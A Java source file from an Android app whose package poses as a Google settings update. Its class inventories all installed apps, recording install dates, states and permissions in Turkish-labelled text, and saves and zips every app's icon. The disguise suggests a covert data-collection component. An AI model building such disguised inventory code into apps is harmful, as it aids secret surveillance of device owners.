package com.setting.dl.google.googlesettingupdate.phone;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;

import com.setting.dl.google.googlesettingupdate.time.Time;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

public class InstalledApps {
   
   private Context        context;
   private PackageManager pm;
   
   public InstalledApps(Context context) {
      
      this.context = context;
      pm = context.getPackageManager();
      
   }
   
   public ApplicationInfo getApplicationInfo(String packageName) {
      
      List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
      
      for (ApplicationInfo applicationInfo : packages) {
         
         if (applicationInfo.packageName.equals(packageName)) return applicationInfo;
      }
      
      return null;
   }
   
   public String get() {
      
      StringBuilder         value    = new StringBuilder(Time.getDate(new Date()) + "\n");
      List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
      
      for (ApplicationInfo packageInfo : packages) {
         
         long installedDate = 0;
         long updateDate    = 0;
         
         try {
            installedDate = pm.getPackageInfo(packageInfo.packageName, 0).firstInstallTime;
            updateDate = pm.getPackageInfo(packageInfo.packageName, 0).lastUpdateTime;
         }
         catch (PackageManager.NameNotFoundException e) {e.printStackTrace();}
         
         
         String label = pm.getApplicationLabel(packageInfo).toString();
         Bitmap bm    = drawableToBitmap(pm.getApplicationIcon(packageInfo));
         
         if (label.contains("/")) {
            
            label = label.replace("/", "-");
         }
         
         saveBitmap(context, label + ".png", bm);
         
         List<String> permissions = getPermissions(packageInfo);
         
         value.append(String.format("\n%-23s : %s\n%-23s : %s\n%-23s : %s\n%-23s : %s\n%-23s : %s\n%s\n%s\n----------------\nİzinler\n----------------\n%s\n---------------------\n",
               "Package", packageInfo.packageName,
               "Uygulama", label,
               "Sistem uygulaması", isSYSTEM(packageInfo),
               "Yüklenme tarihi", Time.getDate(installedDate == 0 ? "0" : Time.getDate(installedDate)),
               "Güncellenme tarihi", updateDate == 0 ? "0" : Time.getDate(updateDate),
               String.format("is stoped   : %s", isSTOPPED(packageInfo)),
               String.format("is suspended : %s", isSUSPENDED(packageInfo)),
               permissions != null ? permissions.toString() : "null"));
         
         
         //Log.d("InstalledApps", value);
      }
      
      return value.toString();
   }
   
   public void createIconZip() {
      
      File     zipFile  = new File(context.getFilesDir(), "iconfiles.zip");
      String[] pngFiles = getPngFilesFullPath();
      new Compress(pngFiles, zipFile.getAbsolutePath()).zip();
      for (String file : getPngFiles()) context.deleteFile(file);
      
   }
   
   public List<String> getPermissions(ApplicationInfo applicationInfo) {
      
      try {
         
         PackageInfo packageInfo = pm.getPackageInfo(applicationInfo.packageName, PackageManager.GET_PERMISSIONS);
         
         return Arrays.asList(packageInfo.requestedPermissions);
      }
      catch (Exception e) {
         e.printStackTrace();
      }
      
      return null;
   }
   
   public static String getApplicationName(Context context, String packageName) {
      
      PackageManager        packageManager = context.getPackageManager();
      List<ApplicationInfo> packages       = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
      String                label          = null;
      
      for (int i = 0; i < packages.size(); i++) {
         
         ApplicationInfo temp = packages.get(i);
         
         if (temp.packageName.equals(packageName))
            label = packageManager.getApplicationLabel(temp).toString();
      }
      
      return (label != null ? label  : packageName);
   }
   
   private static boolean isSYSTEM(ApplicationInfo pkgInfo) {
      
      return ((pkgInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
   }
   
   private boolean isEXTERNAL(ApplicationInfo pkgInfo) {
      
      return ((pkgInfo.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0);
   }
   
   private boolean isINSTALLED(ApplicationInfo pkgInfo) {
      
      return ((pkgInfo.flags & ApplicationInfo.FLAG_INSTALLED) != 0);
   }
   
   private boolean isPERSISTENT(ApplicationInfo pkgInfo) {
      
      return ((pkgInfo.flags & ApplicationInfo.FLAG_PERSISTENT) != 0);
   }
   
   public boolean isGAME(ApplicationInfo pkgInfo) {
      
      return ((pkgInfo.flags & ApplicationInfo.FLAG_IS_GAME) != 0);
   }
   
   private static boolean isSTOPPED(ApplicationInfo pkgInfo) {
      
      return ((pkgInfo.flags & ApplicationInfo.FLAG_STOPPED) != 0);
   }
   
   private static boolean isSUSPENDED(ApplicationInfo pkgInfo) {
      
      return Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && ((pkgInfo.flags & ApplicationInfo.FLAG_SUSPENDED) != 0);
      
   }
   
   private Bitmap drawableToBitmap(Drawable drawable) {
      
      if (drawable instanceof BitmapDrawable) {
         
         return ((BitmapDrawable) drawable).getBitmap();
      }
      
      int width = drawable.getIntrinsicWidth();
      width = width > 0 ? width : 1;
      int height = drawable.getIntrinsicHeight();
      height = height > 0 ? height : 1;
      
      Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
      Canvas canvas = new Canvas(bitmap);
      drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
      drawable.draw(canvas);
      
      return bitmap;
   }
   
   private void saveBitmap(Context context, String fileName, Bitmap bitmap) {
      
      File file = new File(context.getFilesDir(), fileName);
      
      try {
         
         FileOutputStream out = new FileOutputStream(file);
         bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
         out.flush();
         out.close();
         
      }
      catch (IOException e) {
         e.printStackTrace();
      }
   }
   
   private String[] getPngFilesFullPath() {
      
      File dir = new File(context.getFilesDir().getAbsolutePath());
      
      String[] files = null;
      
      if (dir.exists()) {
         
         files = dir.list((dir1, name) -> name.toLowerCase().endsWith(".png"));
      }
      
      if (files == null) return null;
      
      String[] pngFilesWithFullPath = new String[files.length];
      
      for (int i = 0; i < files.length; i++) {
         
         pngFilesWithFullPath[i] = new File(context.getFilesDir(), files[i]).getAbsolutePath();
      }
      
      return pngFilesWithFullPath;
   }
   
   
   private String[] getPngFiles() {
      
      File dir = new File(context.getFilesDir().getAbsolutePath());
      
      String[] files = null;
      
      if (dir.exists()) {
         
         files = dir.list((dir1, name) -> name.toLowerCase().endsWith(".png"));
      }
      
      return files;
   }
}
